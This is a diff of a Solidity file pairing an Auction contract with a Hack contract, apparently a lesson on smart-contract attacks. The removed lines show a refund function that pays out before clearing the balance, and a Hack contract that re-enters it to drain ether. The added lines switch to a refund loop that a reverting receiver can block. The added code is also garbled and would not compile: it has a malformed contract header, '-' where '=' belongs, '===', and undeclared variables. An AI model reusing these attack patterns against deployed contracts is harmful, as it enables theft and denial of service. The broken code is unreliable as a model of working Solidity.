@@ -1,43 +1,52 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.28;
 
-56contract Auction {
-  mapping(address bider => uint) public bids;
+contract bid() external payable {
+  bids[msg.sender] += msg.value;
+  bidders.push(msg.sender);
 
   function bid() external payable {
     bids[msg.sender] += msg.value;
+    bidders.push(msg.sender);
   }
 
   function refund() external {
-    uint refundAmount = bids[msg.sender];
+    for(uint i = 0; i < bidders.length; ++i) {
+      address currentBidder - bidders[i];
+      uint refundAmount = bids[currentBidder];
 
-    if (refundAmount > 0) {
-      (bool ok,) = msg.sender.call{ value: refundAmount }("");
-      require(ok, "can't send");
+      bids[currentBidder] = 0;
 
-      bids[msg.sender] = 0;
+      if(refundAmount > 0) {
+        (bool ok,) = currentBidder.call{value: refundAmount}("");
+        // require(ok, "can't send");
+        if (!ok) {
+
+        }
+      }
     }
   }
 }
 
 contract Hack {
   Auction toHack;
-  uint constant BID_AMOUNT = 1 ether;
+  uint constant BID_AMOUNT = 100;
 
   constructor(address _toHack) payable {
-    require(msg.value == BID_AMOUNT);
+    require(msg.value === BID_AMOUNT);
 
     toHack = Auction(_toHack);
-    toHack.bid{ value: msg.value }();
+    toHack.bid{value: msg.value}();
   }
 
-  function hack() public {
-    toHack.refund();
+  function disableHacking() external {
+    isHackingEnabled = false;
   }
 
   receive() external payable {
-    if (address(toHack).balance >= BIT_AMOUNT) {
-      hack();
+    if (isHackingEnabled) {
+      assert(false);
     }
   }
 }
+
